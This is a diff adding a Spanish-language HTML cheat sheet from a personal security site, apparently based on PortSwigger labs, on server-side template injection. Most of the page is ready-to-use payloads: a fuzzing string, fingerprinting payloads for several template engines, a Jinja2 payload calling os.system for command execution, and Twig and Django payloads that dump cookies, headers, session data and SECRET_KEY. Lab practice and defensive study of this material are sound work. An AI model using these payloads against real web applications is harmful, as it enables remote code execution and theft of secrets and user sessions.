@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SSTI | PortSwigger · cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="../writeups/writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../portswigger.html" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> PortSwigger</a>
+    </div>
+  </nav>
+
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge fs-6" style="background:#ff6633">PortSwigger</span>
+        <span class="badge bg-warning text-dark fs-6">SSTI</span>
+        <span class="badge bg-secondary">Jinja2</span>
+        <span class="badge bg-secondary">Twig</span>
+        <span class="badge bg-secondary">Django</span>
+        <span class="badge bg-secondary">RCE</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">SSTI — Server-Side Template Injection</h1>
+      <p class="text-secondary mb-0">Detección e identificación del motor de plantillas mediante fuzzing y payloads de fingerprinting.</p>
+    </div>
+
+    <!-- Fuzzing -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-search"></i> Fuzzear caracteres especiales para detectar SSTI</h4>
+      <p class="text-secondary">Inyectar esta cadena para provocar errores de parsing y confirmar inyección:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-warning">Fuzzing string</span></div>
+        <pre><code>${{&lt;%[%'"}}%\</code></pre>
+      </div>
+      <img src="img/ssti/01.png" class="img-fluid rounded border border-secondary mb-3" alt="SSTI fuzzing error response">
+      <p class="text-secondary">Payloads de identificación del motor:</p>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">Fingerprinting payloads</span></div>
+        <pre><code>&lt;%= 7*7 %>        # ERB (Ruby)
+${{7*7}}          # Smarty
+${7*7}            # Freemarker / Mako
+a{*coment*}b      # Smarty
+${"z".join("ab")} # Jinja2 / Python
+{{7*7}}           # Jinja2 / Twig
+{{7*'7'}}         # Jinja2 → 7777777  |  Twig → 49</code></pre>
+      </div>
+    </section>
+
+    <!-- Jinja2 -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-filetype-py"></i> Jinja2 payloads</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">Python / Jinja2</span></div>
+        <pre><code>${{config}}
+${{config.__dict__}}
+${{config.from_object(os)}}
+${{config.from_object(os.system('ls'))}}</code></pre>
+      </div>
+    </section>
+
+    <!-- Twig -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-filetype-php"></i> Twig payloads</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">PHP / Twig</span></div>
+        <pre><code>{{dump(app.request.server.all)}}
+{{dump(app.request.headers)}}
+{{dump(app.request.cookies)}}
+{{dump(app.request.files)}}</code></pre>
+      </div>
+    </section>
+
+    <!-- Django -->
+    <section class="mb-5">
+      <h4 class="text-danger border-left-red mb-3"><i class="bi bi-filetype-py"></i> Django payloads</h4>
+      <div class="code-block">
+        <div class="code-header"><span class="text-warning">Python / Django</span></div>
+        <pre><code>{{settings}}
+{{settings.SECRET_KEY}}
+{{request.META}}
+{{request.session}}</code></pre>
+      </div>
+    </section>
+  </main>
+
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;·&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
